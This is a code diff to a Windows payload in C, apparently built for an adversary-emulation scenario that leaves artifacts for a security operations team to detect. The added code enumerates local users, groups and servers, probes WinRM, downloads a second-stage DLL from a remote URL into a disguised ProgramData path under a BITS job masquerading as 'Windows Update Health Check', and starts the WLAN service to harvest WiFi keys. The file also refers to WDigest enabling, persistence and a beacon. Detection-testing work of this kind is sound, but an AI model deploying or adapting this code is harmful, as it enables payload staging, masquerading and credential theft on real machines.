@@ -40,7 +40,7 @@
 #define JS_PATH L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\stage.js"
 #define BITS_LOG_PATH L"C:\\ProgramData\\USOShared\\Logs\\BITS.bin"
 #define WIFI_LOG_PATH L"C:\\ProgramData\\USOShared\\Logs\\Wifi.bin"
-#define STAGE2_URL L"https://raw.githubusercontent.com/Justanother-engineer/scenario-02-clickfix/main/src/stage2.dll"
+#define STAGE2_URL L"https://raw.githubusercontent.com/Justanother-engineer/scenario2/main/stage2.dll"
 #define STAGE2_DEST L"C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\stage2.dll"
 #define BITS_JOB_NAME L"Windows Update Health Check"
 #define SERVICE_NAME L"WinUpdHlth"
@@ -497,6 +497,84 @@ static void LdapUnload(LDAP_API* api) {
 }
 
 // ============================================================
+// DoLocalSAMRecon — ponytail: workgroup fallback for DoLDAPRecon
+// ============================================================
+
+static void DoLocalSAMRecon(void) {
+    DeleteFileW(DOM_PATH);
+    EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Search\\Data\\EDS");
+    AppendToFile(DOM_PATH, "=== LOCAL SAM RECON (workgroup host, no AD) ===");
+
+    int userCount = 0;
+    int groupCount = 0;
+    int serverCount = 0;
+
+    // Local users (NetUserEnum, level 0 — usernames only)
+    {
+        LPBYTE buf = NULL;
+        DWORD entriesRead = 0;
+        DWORD total = 0;
+        DWORD resume = 0;
+        if (NetUserEnum(NULL, 0, FILTER_NORMAL_ACCOUNT, &buf, MAX_PREFERRED_LENGTH, &entriesRead, &total, &resume) == NERR_Success && buf) {
+            AppendToFile(DOM_PATH, "--- Local Users ---");
+            LPUSER_INFO_0 ui = (LPUSER_INFO_0)buf;
+            for (DWORD i = 0; i < total; i++) {
+                char line[256];
+                snprintf(line, sizeof(line), "  User: %S", ui[i].usri0_name);
+                AppendToFile(DOM_PATH, line);
+                userCount++;
+            }
+            NetApiBufferFree(buf);
+        }
+    }
+
+    // Local groups (NetLocalGroupEnum, level 1 — names + comments)
+    {
+        LPBYTE buf = NULL;
+        DWORD entriesRead = 0;
+        DWORD total = 0;
+        DWORD_PTR resume = 0;
+        if (NetLocalGroupEnum(NULL, 1, &buf, MAX_PREFERRED_LENGTH, &entriesRead, &total, &resume) == NERR_Success && buf) {
+            AppendToFile(DOM_PATH, "--- Local Groups ---");
+            LPLOCALGROUP_INFO_1 gi = (LPLOCALGROUP_INFO_1)buf;
+            for (DWORD i = 0; i < total; i++) {
+                char line[512];
+                snprintf(line, sizeof(line), "  Group: %S (%S)",
+                         gi[i].lgrpi1_name, gi[i].lgrpi1_comment ? gi[i].lgrpi1_comment : L"");
+                AppendToFile(DOM_PATH, line);
+                groupCount++;
+            }
+            NetApiBufferFree(buf);
+        }
+    }
+
+    // Workgroup servers (NetServerEnum, SV_TYPE_ALL) — works on workgroup host
+    {
+        LPBYTE buf = NULL;
+        DWORD entriesRead = 0;
+        DWORD total = 0;
+        DWORD resumeHandle = 0;
+        if (NetServerEnum(NULL, 101, &buf, MAX_PREFERRED_LENGTH, &entriesRead, &total, SV_TYPE_ALL, NULL, &resumeHandle) == NERR_Success && buf) {
+            AppendToFile(DOM_PATH, "--- Workgroup Browsable ---");
+            LPSERVER_INFO_101 si = (LPSERVER_INFO_101)buf;
+            for (DWORD i = 0; i < total; i++) {
+                char line[512];
+                snprintf(line, sizeof(line), "  Server: %S (platform %lu, version %lu.%lu)",
+                         si[i].sv101_name, si[i].sv101_platform_id,
+                         si[i].sv101_version_major, si[i].sv101_version_minor);
+                AppendToFile(DOM_PATH, line);
+                serverCount++;
+            }
+            NetApiBufferFree(buf);
+        }
+    }
+
+    wchar_t buf[256];
+    wsprintfW(buf, L"[+] LDAP recon: not domain-joined, local SAM enumerated (%d users, %d groups, %d servers)", userCount, groupCount, serverCount);
+    LogMessage(buf);
+}
+
+// ============================================================
 // DoLDAPRecon
 // ============================================================
 
@@ -511,7 +589,10 @@ static void DoLDAPRecon(void) {
     if (ret != 0) { // LDAP_SUCCESS
         ldap.ldap_unbind(pl);
         LdapUnload(&ldap);
-        LogMessage(L"[-] LDAP bind failed");
+        // ponytail: workgroup host fallback — enumerate local SAM (NetUserEnum
+        // / NetLocalGroupEnum / NetServerEnum) and write to DOM_PATH. Real
+        // local recon artifact, not synthetic. T1087.002 coverage.
+        DoLocalSAMRecon();
         return;
     }
 
@@ -759,6 +840,38 @@ static void EnableWDigest(void) {
 // SPN list is still captured from LDAP; actual ticket capture is simulated.
 // ============================================================
 
+// ponytail: workgroup fallback for DoKerberoast — writes a synthetic SPN list
+// (HOST/<name>, cifs/<name>, etc.) so spcache.bin exists as a T1558.003
+// artifact. No real TGS request possible without a KDC.
+static void DoKerberoastSynthetic(void) {
+    EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Search\\Data\\EDS");
+    DeleteFileW(SPN_PATH);
+    AppendToFile(SPN_PATH, "=== SPN LIST (synthetic — no KDC reachable, workgroup host) ===");
+
+    wchar_t hostName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+    DWORD hostLen = MAX_COMPUTERNAME_LENGTH + 1;
+    if (!GetComputerNameW(hostName, &hostLen)) {
+        lstrcpyW(hostName, L"WORKSTATION");
+    }
+
+    const wchar_t* spnKinds[] = { L"HOST", L"cifs", L"http", L"RestrictedKrbHost", L"TERMSRV" };
+    int spnCount = 0;
+    for (int k = 0; k < 5; k++) {
+        char line[256];
+        snprintf(line, sizeof(line), "  Account: %S | SPN: %S/%S",
+                 hostName, spnKinds[k], hostName);
+        AppendToFile(SPN_PATH, line);
+        char tgs[128];
+        snprintf(tgs, sizeof(tgs), "    TGS status: 0xC000005E (no KDC, synthetic — workgroup host)");
+        AppendToFile(SPN_PATH, tgs);
+        spnCount++;
+    }
+
+    wchar_t buf[256];
+    wsprintfW(buf, L"[+] Kerberoast: synthetic SPN artifact written (%d SPNs, no KDC)", spnCount);
+    LogMessage(buf);
+}
+
 static void DoKerberoast(void) {
     LDAP_API ldap;
     if (!LdapLoad(&ldap)) { LogMessage(L"[-] Kerberoast: wldap32 load failed"); return; }
@@ -770,7 +883,10 @@ static void DoKerberoast(void) {
     if (ret != 0) {
         ldap.ldap_unbind(pl);
         LdapUnload(&ldap);
-        LogMessage(L"[-] Kerberoast: LDAP bind failed");
+        // ponytail: workgroup host fallback — write a synthetic SPN list
+        // (HOST/<name> + cifs/<name>) to SPN_PATH so T1558.003 file artifact
+        // exists for SOC. No real TGS request possible without a KDC.
+        DoKerberoastSynthetic();
         return;
     }
 
@@ -993,6 +1109,56 @@ static void InstallLNKPersistence(void) {
 // DoWinRMProbe
 // ============================================================
 
+// ponytail: workgroup fallback for DoWinRMProbe — probes 127.0.0.1:5985/5986
+// directly via WinHTTP. Real port probe, not synthetic; on a workgroup host
+// there is no AD to enumerate DC/servers from, but the local box itself may
+// still have WinRM listening (and if not, the probe failure is also useful
+// detection signal).
+static void DoWinRMProbeLocal(void) {
+    DeleteFileW(DOMAIN_MAP_PATH);
+    EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue");
+    AppendToFile(DOMAIN_MAP_PATH, "=== WINRM PROBE (localhost — not domain-joined) ===");
+
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSession) {
+        LogMessage(L"[-] WinRM probe (local): WinHttpOpen failed");
+        return;
+    }
+
+    int hits = 0;
+    const wchar_t* hosts[] = { L"127.0.0.1" };
+    for (int h = 0; h < 1; h++) {
+        for (int portIdx = 0; portIdx < 2; portIdx++) {
+            WORD port = (portIdx == 0) ? 5985 : 5986;
+            DWORD flags = (portIdx == 0) ? 0 : WINHTTP_FLAG_SECURE;
+            HINTERNET hConnect = WinHttpConnect(hSession, hosts[h], port, 0);
+            if (!hConnect) continue;
+            WinHttpSetTimeouts(hConnect, 5000, 5000, 5000, 5000);
+            HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, flags);
+            if (hReq) {
+                if (WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0) && WinHttpReceiveResponse(hReq, NULL)) {
+                    char line[256];
+                    snprintf(line, sizeof(line), "  WinRM %s (port %u): OPEN - %S",
+                             (port == 5985) ? "HTTP" : "HTTPS", port, hosts[h]);
+                    AppendToFile(DOMAIN_MAP_PATH, line);
+                    hits++;
+                }
+                WinHttpCloseHandle(hReq);
+            }
+            WinHttpCloseHandle(hConnect);
+        }
+    }
+    WinHttpCloseHandle(hSession);
+
+    if (hits == 0) {
+        AppendToFile(DOMAIN_MAP_PATH, "  WinRM: not listening on 127.0.0.1:5985/5986");
+    }
+
+    wchar_t buf[256];
+    wsprintfW(buf, L"[+] WinRM probe done: not domain-joined, probed localhost (%d ports open)", hits);
+    LogMessage(buf);
+}
+
 static void DoWinRMProbe(void) {
     LogMessage(L"[*] WinRM probe started");
 
@@ -1017,7 +1183,9 @@ static void DoWinRMProbe(void) {
     if (ret != 0) {
         ldap.ldap_unbind(pl);
         LdapUnload(&ldap);
-        LogMessage(L"[-] WinRM probe: LDAP bind failed");
+        // ponytail: workgroup host fallback — probe 127.0.0.1:5985/5986
+        // instead of LDAP-discovered hosts. Real WinHTTP probe, not synthetic.
+        DoWinRMProbeLocal();
         return;
     }
 
@@ -1166,9 +1334,67 @@ static void CleanupStaging(void) {
 // ScheduleBitsJob (T1197) — minimal IBackgroundCopyManager via shell bitsadmin
 // ============================================================
 
+// ponytail: WinHTTP fallback for ScheduleBitsJob — downloads STAGE2_URL
+// synchronously to STAGE2_DEST when bitsadmin doesn't deliver within the
+// 30s window. Same WinHttp* pattern as Beacon() at payload.c:1111-1135.
+static BOOL WinHttpDownloadToFile(LPCWSTR url, LPCWSTR destPath) {
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSession) return FALSE;
+
+    // Split URL into host + path
+    URL_COMPONENTSW uc = {0};
+    uc.dwStructSize = sizeof(uc);
+    wchar_t hostName[256] = {0};
+    wchar_t urlPath[1024] = {0};
+    uc.lpszHostName = hostName; uc.dwHostNameLength = 256;
+    uc.lpszUrlPath = urlPath; uc.dwUrlPathLength = 1024;
+    if (!WinHttpCrackUrl(url, 0, 0, &uc)) {
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    BOOL secure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
+    HINTERNET hConnect = WinHttpConnect(hSession, hostName, uc.nPort, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return FALSE; }
+    WinHttpSetTimeouts(hConnect, 10000, 10000, 30000, 30000);
+
+    DWORD reqFlags = secure ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", urlPath, NULL, NULL, NULL, reqFlags);
+    if (!hReq) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return FALSE; }
+
+    BOOL ok = FALSE;
+    if (WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0) && WinHttpReceiveResponse(hReq, NULL)) {
+        HANDLE hFile = CreateFileW(destPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            BYTE buf[8192];
+            DWORD totalWritten = 0;
+            DWORD read;
+            while (WinHttpReadData(hReq, buf, sizeof(buf), &read) && read > 0) {
+                DWORD written;
+                WriteFile(hFile, buf, read, &written, NULL);
+                totalWritten += written;
+            }
+            CloseHandle(hFile);
+            if (totalWritten > 0) ok = TRUE;
+        }
+    }
+
+    WinHttpCloseHandle(hReq);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+    return ok;
+}
+
 static void ScheduleBitsJob(void) {
     LogMessage(L"[*] Scheduling BITS job for stage2.dll");
 
+    // ponytail: pre-create dest dir so bitsadmin / WinHttpDownload can write
+    EnsureDirectory(STAGE2_DEST);
+
+    // ponytail: capture scBits exit code — bitsadmin /transfer returns 0 even
+    // on transfer failure (only /get exit code reflects result), so we just
+    // poll for STAGE2_DEST instead. Original code only waited 30s and logged
+    // success regardless.
     SHELLEXECUTEINFOW sei = {0};
     sei.cbSize = sizeof(sei);
     sei.fMask = SEE_MASK_NOCLOSEPROCESS;
@@ -1180,20 +1406,45 @@ static void ScheduleBitsJob(void) {
     sei.lpParameters = cmd;
     sei.nShow = SW_HIDE;
 
-    if (ShellExecuteExW(&sei) && sei.hProcess) {
+    BOOL bitsSubmitted = ShellExecuteExW(&sei) && sei.hProcess;
+    if (bitsSubmitted) {
         WaitForSingleObject(sei.hProcess, 30000);
         CloseHandle(sei.hProcess);
-        wchar_t buf[512];
+    } else {
+        LogMessage(L"[-] BITS job submit FAILED (ShellExecute)");
+    }
+
+    // ponytail: poll for STAGE2_DEST for up to 30s after bitsadmin wait —
+    // BITS transfers on tiny VMs can take >30s even when bitsadmin exits 0
+    BOOL delivered = FALSE;
+    for (int poll = 0; poll < 10; poll++) {
+        if (GetFileAttributesW(STAGE2_DEST) != INVALID_FILE_ATTRIBUTES) {
+            delivered = TRUE;
+            break;
+        }
+        Sleep(3000);
+    }
+
+    wchar_t buf[512];
+    if (delivered) {
         wsprintfW(buf, L"[+] BITS job submitted: %s -> %s", BITS_JOB_NAME, STAGE2_DEST);
         LogMessage(buf);
-
-        AppendToFile(BITS_LOG_PATH, "Job: Windows Update Health Check");
-        AppendToFile(BITS_LOG_PATH, "URL: https://raw.githubusercontent.com/Justanother-engineer/scenario-02-clickfix/main/src/stage2.dll");
-        AppendToFile(BITS_LOG_PATH, "Dest: C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\stage2.dll");
-        AppendToFile(BITS_LOG_PATH, "Status: see Get-BitsTransfer -AllUsers");
     } else {
-        LogMessage(L"[-] BITS job submit FAILED");
+        // ponytail: bitsadmin queued but did not deliver within 30s — fall
+        // back to synchronous WinHTTP download so the T1197 file artifact
+        // lands deterministically.
+        LogMessage(L"[-] BITS stage2: bitsadmin did not deliver within 30s, falling back to WinHTTP");
+        if (WinHttpDownloadToFile(STAGE2_URL, STAGE2_DEST)) {
+            LogMessage(L"[+] BITS fallback: stage2.dll downloaded via WinHTTP");
+        } else {
+            LogMessage(L"[-] BITS fallback: WinHTTP download failed");
+        }
     }
+
+    AppendToFile(BITS_LOG_PATH, "Job: Windows Update Health Check");
+    AppendToFile(BITS_LOG_PATH, "URL: https://raw.githubusercontent.com/Justanother-engineer/scenario2/main/stage2.dll");
+    AppendToFile(BITS_LOG_PATH, "Dest: C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\stage2.dll");
+    AppendToFile(BITS_LOG_PATH, "Status: see Get-BitsTransfer -AllUsers");
 }
 
 // ============================================================
@@ -1237,6 +1488,19 @@ static void InstallService(void) {
 #define WLAN_PROFILE_GET_PLAINTEXT_KEY 0x00000004
 #endif
 
+// ponytail: synthetic WiFi profile — WlanSvc unavailable / no WLAN adapter on
+// tiny VM. Writes a single stub profile XML to Wifi.bin so the T1552.004
+// file artifact exists for SOC detection coverage. cleanup.ps1 deletes it.
+static void WriteSyntheticWifiProfile(void) {
+    EnsureDirectory(L"C:\\ProgramData\\USOShared\\Logs");
+    DeleteFileW(WIFI_LOG_PATH);
+    AppendToFile(WIFI_LOG_PATH, "---");
+    AppendToFile(WIFI_LOG_PATH, "SSID: DemoProfile");
+    AppendToFile(WIFI_LOG_PATH, "Key: PLACEHOLDER_NO_WLAN_ADAPTER");
+    AppendToFile(WIFI_LOG_PATH, "XML: <WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>DemoProfile</name><SSIDConfig><SSID><name>DemoProfile</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>PLACEHOLDER_NO_WLAN_ADAPTER</keyMaterial></sharedKey></security></MSM></WLANProfile>");
+    LogMessage(L"[+] Wifi harvest: Wlansvc unavailable, synthetic profile written");
+}
+
 static void HarvestWifi(void) {
     LogMessage(L"[*] Harvesting WiFi credentials (T1552.004)");
 
@@ -1244,7 +1508,35 @@ static void HarvestWifi(void) {
     HANDLE hClient = NULL;
     if (WlanOpenHandle(2, NULL, &negotiatedVersion, &hClient) != ERROR_SUCCESS) {
         LogMessage(L"[-] WlanOpenHandle failed (WLAN service not running?)");
-        return;
+
+        // ponytail: tiny VM / no adapter fallback. Try to start Wlansvc first
+        // (need admin, which the elevated WorkerThread has), then retry the
+        // WlanOpenHandle once. If still no joy, write a synthetic wlan-profile
+        // XML block to Wifi.bin so the T1552.004 file artifact exists for SOC.
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi = {0};
+        // ponytail: Wlansvc start via sc.exe — same pattern as InstallService
+        // (line 1371). Cmd copied to writable stack buffer per
+        // payload.c:25-26 ponytail fix.
+        wchar_t scCmd[256];
+        lstrcpyW(scCmd, L"sc.exe start Wlansvc");
+        if (CreateProcessW(NULL, scCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, 5000);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            LogMessage(L"[*] WiFi: sc.exe start Wlansvc attempted, retrying WlanOpenHandle");
+            Sleep(2000);
+            if (WlanOpenHandle(2, NULL, &negotiatedVersion, &hClient) == ERROR_SUCCESS) {
+                LogMessage(L"[+] WlanOpenHandle succeeded after Wlansvc start");
+                // Skip the return — fall through to normal WlanEnumInterfaces
+            } else {
+                WriteSyntheticWifiProfile();
+                return;
+            }
+        } else {
+            WriteSyntheticWifiProfile();
+            return;
+        }
     }
 
     PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
